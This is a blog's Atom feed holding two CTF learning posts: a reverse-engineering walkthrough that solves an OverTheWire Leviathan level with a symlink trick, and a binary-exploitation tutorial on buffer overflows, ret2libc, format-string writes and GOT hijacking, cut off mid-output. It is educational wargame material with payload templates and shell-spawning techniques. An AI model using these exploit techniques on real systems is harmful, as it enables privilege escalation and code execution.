<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[tech.bitvijays.com]]></title>
  <link href="http://bitvijays.github.io/atom.xml" rel="self"/>
  <link href="http://bitvijays.github.io/"/>
  <updated>2015-01-27T14:06:27+00:00</updated>
  <id>http://bitvijays.github.io/</id>
  <author>
    <name><![CDATA[Vijay Kumar]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Learning From CTF : Reverse Engineering]]></title>
    <link href="http://bitvijays.github.io/blog/2015/01/02/learning-from-ctf-reverse-engineering/"/>
    <updated>2015-01-02T03:15:59+00:00</updated>
    <id>http://bitvijays.github.io/blog/2015/01/02/learning-from-ctf-reverse-engineering</id>
    <content type="html"><![CDATA[<p>This post lists the learnings from the CTF while doing Reverse Engineering.</p>

<!-- more -->


<p>If we are provided with a binary to reverse engineer, for example asking for password.</p>

<ol>

<li>
file: The first step is to run file command on the binary which would tell us whether it is 32/64 bit or statically/dynamically linked etc.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bitvijays@kali:~/Desktop/CTF/31C3$ file cfy 
</span><span class='line'>cfy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x9bc623f046535fba50a2124909fb871e5daf198e, not stripped</span></code></pre></td></tr></table></div></figure>
</li>
<li>
The second step could be running strings or &#8220;hexdump -C&#8221; on it, specially in the case of very simple re challenges like asking for password and stored in an array.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bitvijays@kali:~$ strings check 
</span><span class='line'>/lib/ld-linux.so.2
</span><span class='line'>D$,1
</span><span class='line'>D$%secrf
</span><span class='line'>D$)et
</span><span class='line'>D$ love
</span><span class='line'>T$,e3
</span><span class='line'>[^_]
</span><span class='line'>password: 
</span><span class='line'>/bin/sh
</span><span class='line'>Wrong password, Good Bye ...
</span><span class='line'>;*2$"</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hexdump -C check | more 
</span><span class='line'>00000540  31 c0 c7 44 24 18 73 65  78 00 c7 44 24 25 73 65  |1..D$.sec..D$%se|
</span><span class='line'>00000550  63 72 66 c7 44 24 29 65  74 c6 44 24 2b 00 c7 44  |crf.D$)et.D$+..D|
</span><span class='line'>00000560  24 1c 67 6f 64 00 c7 44  24 20 6c 6f 76 65 c6 44  |$.god..D$ love.D|</span></code></pre></td></tr></table></div></figure>
</li>

<li>
The next step could be running strace or ltrace on the binary.

strace: trace system calls and signals
ltrace: A library call tracer
</li>


</ol>


<h3>Examples</h3>

<ol>
<li>Consider a binary which is setuid and used to read files.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ./printfile 
</span><span class='line'>*** File Printer ***
</span><span class='line'>Usage: ./printfile filename
</span><span class='line'>
</span><span class='line'>leviathan2@melinda:~$ ls -la
</span><span class='line'>-r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14 10:32 printfile</span></code></pre></td></tr></table></div></figure>
We need to read 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ls -l /etc/leviathan_pass/leviathan3 
</span><span class='line'>-r-------- 1 leviathan3 leviathan3 11 Nov 14 10:32 /etc/leviathan_pass/leviathan3</span></code></pre></td></tr></table></div></figure>
Let&#8217;s see the ltrace of the binary while accessing a file which we are allowed to read
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2 
</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 &lt;unfinished ...&gt;
</span><span class='line'>access("/etc/leviathan_pass/leviathan2", 4)                                                                            = 0
</span><span class='line'>snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2")                  = 39
</span><span class='line'>system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
</span><span class='line'> &lt;no return ...&gt;
</span><span class='line'>--- SIGCHLD (Child exited) ---
</span><span class='line'>&lt;... system resumed&gt; )                                                                                                 = 0
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>
Let see what happen when we try to access file which we don&#8217;t have permission to.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 &lt;unfinished ...&gt;
</span><span class='line'>access("/etc/leviathan_pass/leviathan3", 4)                                                                            = -1
</span><span class='line'>puts("You cant have that file..."You cant have that file...
</span><span class='line'>)                                                                                     = 27
</span><span class='line'>+++ exited (status 1) +++</span></code></pre></td></tr></table></div></figure>
So it&#8217;s a matter of tricking access(), if the call to access() succeeds then it calls system(&#8220;cat file&#8221;), so if pass the argument printfile /etc/issue, then it works.
We can get around it by using a space in our file name. Eg: touch foo\ bar. then we create a symlink to the password file and call it foo. ln -s /etc/leviathanpass/leviathan3 foo

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ mkdir /tmp/levi
</span><span class='line'>leviathan2@melinda:~$ cd /tmp/levi
</span><span class='line'>leviathan2@melinda:/tmp/levi$ ls
</span><span class='line'>leviathan2@melinda:/tmp/levi$ ln -s /etc/leviathan_pass/leviathan3 ./foo
</span><span class='line'>leviathan2@melinda:/tmp/levi$ touch foo\ bar
</span><span class='line'>leviathan2@melinda:/tmp/levi$ ~/printfile foo\ bar 
</span><span class='line'>Ahdiemoo1j
</span><span class='line'>/bin/cat: bar: No such file or directory</span></code></pre></td></tr></table></div></figure>
</li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Learning From CTF : Binary Exploitation]]></title>
    <link href="http://bitvijays.github.io/blog/2014/11/09/learning-from-ctf-binary-exploitation/"/>
    <updated>2014-11-09T20:42:01+00:00</updated>
    <id>http://bitvijays.github.io/blog/2014/11/09/learning-from-ctf-binary-exploitation</id>
    <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Binary Exploitation challenges during various CTF&rsquo;s and Over The Wire Wargame.</p>

<!-- more -->


<h3>Thanks to superkojiman, barrebas, et0x who helped me learning the concepts.</h3>

<ol>
Let&#8217;s start with some basic concepts and then we would see some examples which would help to clear the concepts.

<li>
Big-endian systems store the most significant byte of a word in the smallest address and the least significant byte is stored in the largest address. Little-endian systems, in contrast, store the least significant byte in the smallest address.
<br>
<img class="left" src="http://bitvijays.github.io/images/big-endian.png" width="250" height="250">
<img class="right" src="http://bitvijays.github.io/images/little-endian.png" width="250" height="250">
</li>
<br><br><br><br><br><br><br><br><br>
<li>When you get a binary for exploitation, we need to find whether it is 32-bit or 64-bit ELF, which platform it is running, whether any buffer overflow prevention techniques has been used, what is EIP offset.
<ul>
<li>Executable binary is running on whether x86 or x86-64.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>uname -a</span></code></pre></td></tr></table></div></figure>
</li>
<li>Whether the binary is compiled for 32 bit or 64 bit.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file binary_file</span></code></pre></td></tr></table></div></figure>
</li>
<li>Multiple Buffer overflow prevention techniques such as RELRO, NoExecute (NX), Stack Canaries, Address Space Layout Randomization (ASLR) and Position Independent Executables (PIE).
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Address space Layout Randomization     : Kernel
</span><span class='line'>Executable Stack Protection            : Compiler
</span><span class='line'>Stack smashing protection              : Compiler
</span><span class='line'>Position Independent Executables       : Compiler
</span><span class='line'>Fortify Source                         : Compiler
</span><span class='line'>Stack Protector                        : Compiler</span></code></pre></td></tr></table></div></figure> 
<ul>
<li> Which buffer overflow prevention techniques are used can be found by running <a href="http://www.trapkit.de/tools/checksec.html">Checksec Script</a>. This script is present in <a href="https://github.com/longld/peda">gdb-peda</a>.</li>
<li>Whether the stack of binary is executable is not can be found by readelf tool. If Program header GNU_STACK has RWE flag, if it has E flag, it&#8217;s executable.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:~$ readelf -l /narnia/narnia8 | grep GNU_STACK
</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10</span></code></pre></td></tr></table></div></figure>
In order to make the stack executable, the program needs to be compiled with -z execstack option and to disable stack smashing option -fno-stack-protector should be used.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -ggdb -m32 -fno-stack-protector -z execstack -o buffer1 buffer1.c</span></code></pre></td></tr></table></div></figure>
</li>

<li>Address Space Layout Randomization (ASLR) controlled by /proc/sys/kernel/randomize_va_space.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Three Values:
</span><span class='line'>
</span><span class='line'>0  : Disable ASLR. This setting is applied if the kernel is booted with the norandmaps boot parameter.
</span><span class='line'>1  : Randomize the positions of the stack, virtual dynamic shared object (VDSO) page, and shared memory regions. The base address of the data segment is located immediately after the end of the executable code segment.
</span><span class='line'>2  : Randomize the positions of the stack, VDSO page, shared memory regions, and the data segment. This is the default setting.</span></code></pre></td></tr></table></div></figure>
You can change the setting temporarily by writing a new value to /proc/sys/kernel/randomize_va_space, for example:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo value &gt; /proc/sys/kernel/randomize_va_space</span></code></pre></td></tr></table></div></figure>
To change the value permanently, add the setting to /etc/sysctl.conf, for example:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kernel.randomize_va_space = value
</span><span class='line'>and run the sysctl -p command.</span></code></pre></td></tr></table></div></figure>
If you change the value of randomize_va_space, you should test your application stack to ensure that it is compatible with the new setting.

If necessary, you can disable ASLR for a specific program and its child processes by using the following command:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% setarch `uname -m` -R program [args ...]</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>


<li>To know the EIP offset, you can use cyclic patterns. Use  pattern_create.rb to create a random pattern which can be used to find the offset and pattern_offset.rb to find the exact offset. 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/usr/share/metasploit-framework/tools/pattern_create.rb 200
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
</span><span class='line'>
</span><span class='line'>/usr/share/metasploit-framework/tools/pattern_offset.rb 0x37654136
</span><span class='line'>[*] Exact match at offset 140</span></code></pre></td></tr></table></div></figure>

</li>
<li>Sometimes, you need to know the address of the variable, inorder to write arbitary value in to it. 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>run gdb &lt;program&gt;
</span><span class='line'>p &&lt;variablename&gt;</span></code></pre></td></tr></table></div></figure> </li>

</ul>
</li>

<li>Buffer overflow:
<ul>
<li>Either you can put the shellcode on the buffer and then redirect the EIP to NOP Sled followed by the shellcode (provided the shellcode used is correct and the stack is executable).</li>
<li>However, if the stack is not executable or the shellcode is not working (happens sometimes), then we can either,
<ul>
<li>export a environment variable with shellcode, find the address of env variable in the stack and then set the return address to starting of the shellcode and get a shell</li>
<li>use return2libc which is a type of ROP: find the address of system function, find the address of &#8220;/bin/sh&#8221; in the stack and execute it like system(&#8220;/bin/sh&#8221;). It is in the format of 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;ADDRofSYSTEM&gt; &lt;4ArbitraryBytes for Return Address&gt; &lt;argument for system[/bin/sh]&gt;</span></code></pre></td></tr></table></div></figure>
4Arbitrary Bytes for Return address could be a JUNK address or &#8220;\xCC\xCC\xCC\xCC&#8221; or address of exit function. 
<ul>
<li>If set to \xCC\xCC\xCC\xCC so after system executes, it tries to return to 0xcccccccc. \xcc is good just to check if you&#8217;re actually jumping to your shellcode, but once you&#8217;ve verified that it works, then you should remove it.</li> 
<li>If a JUNK address is put, the binary will have already executed the shellcode but it will segfault. 
<li>If the proper address of exit() is used, binary will exit cleanly.</li>
</ul>
It&#8217;s better to use /bin/sh instead of /bin/bash since bash drops privs. If /bin/bash is used, it will launch /bin/bash but you&#8217;ll find that you haven&#8217;t elevated your privileges and this can get confusing. so either find another string that points to /bin/sh or set your own env  variable like DASH=/bin/sh and reference that.

Good paper to review is <a href="http://www.exploit-db.com/papers/13204/">Bypassing non-executable-stack during Exploitation (return-to-libc)</a>.
 </li>

<li>Sometimes you need to put a cat to keep the shell alive
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(cat input; cat) | ./binary
</span><span class='line'>input is the payload you are sending.</span></code></pre></td></tr></table></div></figure></li>

</ul></li>
<li>Sometimes we need a shellcode to write a string or for getting a actual shell. A good reference can be found @<a href="http://www.exploit-db.com/papers/13224/">Introduction to Writing Shellcode</a>. Information about various system call integar value need to be present in EAX register is here <a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html">Linux System Call Table</a>.</li>
<li>What we mostly do when exploiting a buffer overflow (when placing the shellcode on stack) is we place our shellcode before EIP, we should also check if we can put our shellcode after EIP. This is particularly useful when some kind of check for shellcode is present in address before EIP. Example: Suppose our EIP is present at offset 80. We would usually do
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c 'print "\x90"*50 + "30 Bytes of ShellCode" + "4 Bytes return address to NOP or shellcode in left"'</span></code></pre></td></tr></table></div></figure>
However, if somekind of check for alphanumeric characters is present for first 80 bytes you won&#8217;t be able to put your shellcode in those 80 bytes. At that point of time you should check if you can overflow post EIP and redirect. For example
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c 'print "A"*80 + "4 Bytes return address to NOP or shellcode in right" + "\x90"*50 + "30 Bytes of ShellCode"'</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
 </li>


<li>Format String Vulnerability:

<ul>
<li>Definition: If an attacker is able to provide the format string to an ANSI C format function in part or as a whole, a format string vulnerability is present. By doing so, the behaviour of the format function is changed, and the attacker may get control over the target application. A format string is an ASCIIZ string that contains text and format parameters.
Example:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("The magic number is: %d\n", 1911);</span></code></pre></td></tr></table></div></figure>
</li>

<li>The behaviour of the format function is controlled by the format string. The function retrieves the parameters requested by the format string from the stack.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("Number %d has no address, number %d has: %08x\n", i, a, &a);</span></code></pre></td></tr></table></div></figure>
From within the printf function the stack looks like:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>stack top
</span><span class='line'>. . .
</span><span class='line'>&lt;&a&gt;
</span><span class='line'>&lt;a&gt;
</span><span class='line'>&lt;i&gt;
</span><span class='line'>A
</span><span class='line'>. . .
</span><span class='line'>stack bottom</span></code></pre></td></tr></table></div></figure></li>
<li>Crashing the Program: By utilizing format strings we can easily trigger some invalid pointer access by just supplying a format string like: 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("%s%s%s%s%s%s%s%s%s%s%s%s");</span></code></pre></td></tr></table></div></figure>
Because ‘%s’ displays memory from an address that is supplied on the stack, where a lot of other data is stored, too, our chances are high to read from an illegal address, which is not mapped.</li>
<li>Viewing the stack: how some parts of the stack memory by using a format string like this: 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("%08x.%08x.%08x.%08x.%08x\n");</span></code></pre></td></tr></table></div></figure>
This works, because we instruct the printf-function to retrieve five parameters from the stack and display them as 8-digit padded hexadecimal numbers. So a possible output may look like:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>40012980.080628c4.bffff7a4.00000005.08059c04</span></code></pre></td></tr></table></div></figure>
This is a partial dump of the stack memory, starting from the current bottom upward to the top of the stack — assuming the stack grows towards the low addresses.</li>

<li>Viewing Memory at any location: We can look at memory locations different from the stack memory by providing an address to the format string.

Our format string is usually located on the stack itself, so we already have near to full control over the space, where the format string lies. The format function internally maintains a pointer to the stack location of the current format parameter. If we would be able to get this pointer pointing into a memory space we can control, we can supply an address to the ‘%s’ parameter. To modify the stack pointer we can simply use dummy parameters that will ‘dig’ up the stack by printing junk:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("AAA0AAA1_%08x.%08x.%08x.%08x.%08x");</span></code></pre></td></tr></table></div></figure>
The ‘%08x’ parameters increase the internal stack pointer of the format function towards the top of the stack. After more or less of this increasing parameters the stack pointer points into our memory: the format string itself. The format function always maintains the lowest stack frame, so if our buffer lies on the stack at all, it lies above the current stack pointer for sure. If we choose the number of ‘%08x’ parameters correctly, we could just display memory from an arbitrary address, by appending ‘%s’ to our string.
In our case the address is illegal and would be ‘AAA0’. Lets replace it with a real one.
Example:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>address = 0x08480110
</span><span class='line'>address (encoded as 32 bit le string): "\x10\x01\x48\x08" 
</span><span class='line'>printf ("\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|");</span></code></pre></td></tr></table></div></figure>
Will dump memory from 0x08480110 until a NUL byte is reached. If we cannot reach the exact format string boundary by using 4-Byte pops (‘%08x’), we have to pad the format string, by prepending one, two or three junk characters. 3 This is analog to the alignment in buffer overflow exploits.
</li>

<li>Overwriting of Arbitrary Memory: There is the ‘%n’ parameter, which writes the number of bytes already printed, into a variable of our choice. The address of the variable is given to the format function by placing an integer pointer as parameter onto the stack. But if we supply a correct mapped and writeable address this works and we overwrite four bytes (sizeof (int)) 
at the address: 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"\xc0\xc8\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n"</span></code></pre></td></tr></table></div></figure>
The format string above will overwrite four bytes at 0xbfffc8c0 with a small integer number. We have reached one of our goals: we can write to arbitrary addresses. By using a dummy parameter ‘%nu’ we are able to control the counter written by ‘%n’, at least a bit. </li>

<li>Direct Parameter Access: The direct parameter access is controlled by the ‘$’ qualifier: 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>printf ("%6$d\n", 6, 5, 4, 3, 2, 1);</span></code></pre></td></tr></table></div></figure> Prints ‘1’, because the ‘6$’ explicitly addresses the 6th parameter on the stack.
</li>
<li>The above text is taken from and a good paper to read for format string is <a href="www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Format_String/files/formatstring-1.2.pdf">Exploiting Format String Vulnerabilities</a></li>
<li>We can write two bytes by %hn and one byte by %hhn.</li>
<li> How to write four bytes?
Suppose we need to write 0x8048706 to the address 0xffffd64c.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HOB:0x0804
</span><span class='line'>LOB:0x8706
</span><span class='line'>
</span><span class='line'>If HOB &lt; LOB
</span><span class='line'>
</span><span class='line'>[addr+2][addr] = \x4e\xd6\xff\xff\x4c\xd6\xff\xff
</span><span class='line'>%.[HOB - 8]x   = 0x804 - 8 = 7FC (2044) = %.2044x
</span><span class='line'>%[offset]$hn   = %6\$hn
</span><span class='line'>%.[LOB - HOB]x = 0x8706 - 0x804 = 7F02 (32514) = %.32514x
</span><span class='line'>%[offset+1]$hn = %7\$hn
</span><span class='line'>
</span><span class='line'>`python -c 'print "\x4e\xd6\xff\xff\x4c\xd6\xff\xff" +"%.2044x%6\$hn %.32514x%7\$hn"'`</span></code></pre></td></tr></table></div></figure>
</li>

<li>Hijack the Global Offset Table with pointers:
<ul>
<li>Whatis: The Global Offset Table redirects position independent address calculations to an absolute location and is
located in the .got section of an ELF executable or shared object. It stores the final (absolute) location
of a function calls symbol, used in dynamically linked code. When a program requests to use printf() for
instance, after the rtld locates the symbol, the location is then relocated in the GOT and allows for the
executable via the Procedure Linkage Table, to directly access the symbols location.</li>
<li>when you disassemble main and printf statement is present, you will get like
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   0x080484b9 &lt;+60&gt;:   call   0x8048330 &lt;printf@plt&gt;           &lt;----PLT</span></code></pre></td></tr></table></div></figure>
if you further disassemble printf
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ pdisass printf
</span><span class='line'>Dump of assembler code for function printf@plt:
</span><span class='line'>   0x08048330 &lt;+0&gt;: jmp    DWORD PTR ds:0x8049788           &lt;----GOT Address
</span><span class='line'>   0x08048336 &lt;+6&gt;: push   0x0
</span><span class='line'>   0x0804833b &lt;+11&gt;:    jmp    0x8048320
</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>
Further disassembling the address 0x8049788
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ pdisass 0x8049788
</span><span class='line'>Dump of assembler code from 0x8049788 to 0x80497a8:
</span><span class='line'>   0x08049788 &lt;printf@got.plt+0&gt;:   add    DWORD PTR ss:[eax+ecx*1],0x46
</span><span class='line'>   0x0804978d &lt;fgets@got.plt+1&gt;:    add    DWORD PTR [eax+ecx*1],0x56
</span><span class='line'>   0x08049791 &lt;puts@got.plt+1&gt;: add    DWORD PTR [eax+ecx*1],0x66
</span><span class='line'>   0x08049795 &lt;__gmon_start__@got.plt+1&gt;:   add    DWORD PTR [eax+ecx*1],0x76
</span><span class='line'>   0x08049799 &lt;__libc_start_main@got.plt+1&gt;:    add    DWORD PTR [eax+ecx*1],0x0
</span><span class='line'>   0x0804979d &lt;data_start+1&gt;:   add    BYTE PTR [eax],al
</span><span class='line'>   0x0804979f &lt;data_start+3&gt;:   add    BYTE PTR [eax],al
</span><span class='line'>   0x080497a1 &lt;__dso_handle+1&gt;: add    BYTE PTR [eax],al
</span><span class='line'>   0x080497a3 &lt;__dso_handle+3&gt;: add    BYTE PTR [eax],al
</span><span class='line'>   0x080497a5 &lt;stdin@@GLIBC_2.0+1&gt;: add    BYTE PTR [eax],al
</span><span class='line'>   0x080497a7 &lt;stdin@@GLIBC_2.0+3&gt;: add    BYTE PTR [eax],al
</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>
Objdump reflects the same (notice the +1) GOT address:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>objdump --dynamic-reloc ./behemoth3 
</span><span class='line'>
</span><span class='line'>./behemoth3:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE 
</span><span class='line'>08049778 R_386_GLOB_DAT    __gmon_start__
</span><span class='line'>080497a4 R_386_COPY        stdin
</span><span class='line'>08049788 R_386_JUMP_SLOT   printf
</span><span class='line'>0804978c R_386_JUMP_SLOT   fgets
</span><span class='line'>08049790 R_386_JUMP_SLOT   puts
</span><span class='line'>08049794 R_386_JUMP_SLOT   __gmon_start__
